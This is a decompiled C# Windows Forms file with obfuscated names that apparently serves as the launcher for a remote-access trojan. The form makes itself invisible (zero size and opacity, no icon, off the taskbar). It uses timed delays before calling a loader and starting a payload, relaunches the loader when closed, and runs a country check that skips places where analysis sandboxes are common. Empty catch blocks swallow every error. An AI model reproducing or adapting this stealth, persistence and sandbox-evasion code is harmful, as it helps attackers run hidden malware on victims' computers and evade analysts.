using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace trbgertrnion;

public class Form1 : Form
{
	private MCRSIDM jlthagniasmainvp = new MCRSIDM();

	private THRARWE thiqavsnaisStateObj = new THRARWE();

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void thiqavsnaiscallCon()
	{
		try
		{
			TimerCallback callback = thiqavsnaissetupCons;
			Timer trbgertrniontimer = new Timer(callback, thiqavsnaisStateObj, 32110, 32110);
			thiqavsnaisStateObj.trbgertrniontimer = trbgertrniontimer;
		}
		catch
		{
		}
	}

	private void thiqavsnaissetupCons(object dource)
	{
		try
		{
			jlthagniasmainvp.trbgertrnionloaad_app();
			thiqavsnaisStateObj.trbgertrniontimer.Dispose();
		}
		catch
		{
		}
	}

	private bool check_country(string country)
	{
		if (country != "united state" && country != "ireland" && country != "netherlands" && country != "russian federation" && country != "ukraine" && country != "united states" && country != "united states of america" && country != "hong kong" && country != "singapore" && country != "germany")
		{
			return true;
		}
		return false;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			Thread.Sleep(1212);
			((Form)this).set_ShowInTaskbar(false);
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			thiqavsnaiscallCon();
			Thread.Sleep(6212);
			jlthagniasmainvp.trbgertrniondoa_start();
		}
		catch
		{
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			Thread.Sleep(220);
			jlthagniasmainvp.trbgertrnionloaad_app();
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
